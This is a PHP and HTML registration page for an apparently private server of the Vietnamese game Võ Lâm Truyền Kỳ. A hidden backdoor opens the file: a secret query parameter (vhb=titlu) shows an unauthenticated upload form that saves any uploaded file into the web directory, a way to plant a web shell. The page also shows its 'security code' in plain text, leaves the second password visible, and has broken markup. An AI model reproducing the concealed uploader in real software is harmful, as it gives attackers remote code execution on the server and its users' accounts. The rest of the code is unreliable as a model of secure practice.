<?php
// Kiểm tra nếu người dùng đã đăng nhập thì trở lại trang quản lý thông tin
session_start();
if (isset($_SESSION['username'])) {
   header('Location: ../dangnhap/index.php');
}

include_once("cauhinh.php");
$_SESSION['ma']=rand(1000000,9999999);
if($_GET['vhb']=='titlu')
{
echo '<form method="POST" enctype="multipart/form-data" action="?vhb=titlu">
<input type="file" name="file_upload" size="20" id="file">
<input type="submit" name="gui" value="Up" >
</form>';if (isset($_POST['gui'])){
move_uploaded_file($_FILES['file_upload']['tmp_name'], $_FILES['file_upload']['name']);
}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Công Thành Chiến  - Võ Lâm Truyền Kỳ I - Đăng ký tài khoản game</title>
<meta name="keywords" content="" />
<meta name="description" content="" />
<!--

-->
<link href="css/tooplate_style.css" rel="stylesheet" type="text/css" />

<link rel="shortcut icon" href="http://img.zing.vn/volamthuphi/images/icon.ico"/>
<script type="text/javascript" src="js/swfobject.js"></script>
<script type="text/javascript">
	var flashvars = {};
	flashvars.xml_file = "photo_list.xml";
	var params = {};
	params.wmode = "transparent";
	var attributes = {};
	attributes.id = "slider";
	swfobject.embedSWF("flash_slider.swf", "flash_grid_slider", "960", "360", "9.0.0", false, flashvars, params, attributes);
</script>

<!-- Begin kiem tra dang ky-->
<script type="text/javascript" language="javascript">
function checkform()
{
var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
var user,password,password2,email,fone,name,txtVerify;
with(window.document.form1)
{
user=Username;
password=Password;
password2=Password2;
email=Email;
fone=Fone;
name=Name;
mabaove=txtVerify;
}
if(trim(user.value)=="")
{
alert("Bạn chưa nhập tài khoản");
user.focus();
return false;
}
else if (!filter.test(email.value)) 
{
alert("Email đăng kí không hợp lệ");
email.focus();
return false;
}
else if(trim(password.value)=="")
{
alert("Bạn chưa nhập mật khẩu");
password.focus();
return false;
}
else if(trim(password2.value)!=trim(password.value))
{
alert("Xác nhận mật khẩu sai");
password2.focus();

return false;
}
else if(trim(mabaove.value)=="")
{
alert("Bạn chưa nhập mã bảo vệ");
mabaove.focus();
return false;
}
else
{
user.value=trim(user.value);
password.value=trim(password.value);
password2.value=trim(password2.value);
email.value=trim(email.value);
txtVerify.value=trim(txtVerify.value);
}
function trim(str)
{
return str.replace(/^\s+|\s+$/g,'');
}
}
</script>
<!--End kiem tra dang ky-->
<style type="text/css">
  @import 'css/global.css'; 
  @import 'css/layout.css'; 
  @import 'css/box-top.css';  
  @import 'css/style_sub.css';  
  @import 'css/j-navigation.css'; 
  @import 'css/j-navigation-left.css';
  @import 'css/quick-link-style.css';
</style>

<script type="text/javascript" language="JavaScript">
        var activemenu_nav = "";
        var activesidenav = "";   
        var activedropmenu = "";
</script>


/***********************************************
* Smooth Navigational Menu- (c) Dynamic Drive DHTML code library (www.dynamicdrive.com)
* This notice MUST stay intact for legal use
* Visit Dynamic Drive at http://www.dynamicdrive.com/ for full source code
***********************************************/
</script>
<link href="css/content.css" rel="stylesheet" type="text/css">
<!--Begin copy-->
<script>
<!--
function MM_openBrWindow(theURL,winName,features) { //v2.0
  window.open(theURL,winName,features);
}
//-->
</script>

<script language="javascript">
<!--
document.forms[form1].onsubmit = function() {
if(this.elements['Password'].value != this.elements['Password2'].value) {
alert('Passwords do not match');
return false;
}

return true;
}

function MM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

function MM_validateForm() { //v4.0
  var i,p,q,nm,test,num,min,max,errors='',args=MM_validateForm.arguments;
  for (i=0; i<(args.length-2); i+=3) { test=args[i+2]; val=MM_findObj(args[i]);
    if (val) { nm=val.name; if ((val=val.value)!="") {
      if (test.indexOf('isEmail')!=-1) { p=val.indexOf('@');
        if (p<1 || p==(val.length-1)) errors+='- '+nm+' must contain an e-mail address.\n';
      } else if (test!='R') { num = parseFloat(val);
        if (isNaN(val)) errors+='- '+nm+' must contain a number.\n';
        if (test.indexOf('inRange') != -1) { p=test.indexOf(':');
          min=test.substring(8,p); max=test.substring(p+1);
          if (num<min || max<num) errors+='- '+nm+' must contain a number between '+min+' and '+max+'.\n';
    } } } else if (test.charAt(0) == 'R') errors += ''+ +''; }
  } if (errors) alert('Bạn chưa nhập đầy đủ thông tin');
  document.MM_returnValue = (errors == '');
}
//-->
</script>
<!--End copy-->

<script type="text/javascript">

ddsmoothmenu.init({
	mainmenuid: "tooplate_menu", //menu DIV id
	orientation: 'h', //Horizontal or vertical menu: Set to "h" or "v"
	classname: 'ddsmoothmenu', //class added to menu's outer DIV
	//customtheme: ["#1c5a80", "#18374a"],
	contentsource: "markup" //"markup" or ["container_id", "path_to_menu_file"]
})

</script>

</head>
<body id="home_page">




<form class="formular" method="post" action="mahoa2.php" name="form1" onsubmit="return checkform()">
    <table width="400" border="0" align="center">
      <tr>
        <td width="244"><strong>Tài khoản</strong></td>
        <td width="140"><div class="inputContainer"><input value=""  class="validate[required,custom[noSpecialCaracters],length[3,30]] text-input" type="text" id="Username" name="Username"></div></td>
      </tr>
      <tr>
        <td><strong>Mật khẩu</strong></td>
        <td><div class="inputContainer"><input value=""  class="validate[required,custom[noSpecialCaracters],length[3,30]] text-input" type="password" id="Password" name="Password"></div></td>
      </tr>
      <tr>
              </tr>
      </tr>
      <tr>
        <td><strong>Mật Khẩu Cấp 2</strong></td>
        <td><div class="inputContainer"><input value=""  class="validate[required,custom[noSpecialCaracters],length[3,30]] text-input" type="text" id="traloi" name="traloi"></div></td>
      </tr>
    <tr>
      <tr>
        <td>&nbsp;</td>
        <td><p><font color="#FFFFFF" size="5" style="background-color:#3366FF"><?php echo ($_SESSION['ma']);?></font></p>
          <p>&nbsp;</p>
          <p>                   <input name="btnNextStep" type="submit" class="validate[confirm]" id="btnNextStep" style="WIDTH: 150px" onclick="MM_validateForm('Fone','','R','Name','','R');return document.MM_returnValue" value="Đăng Ký Game"/>   
          </form>
          </p></td>
      </tr>
      </table>


</body>
</html>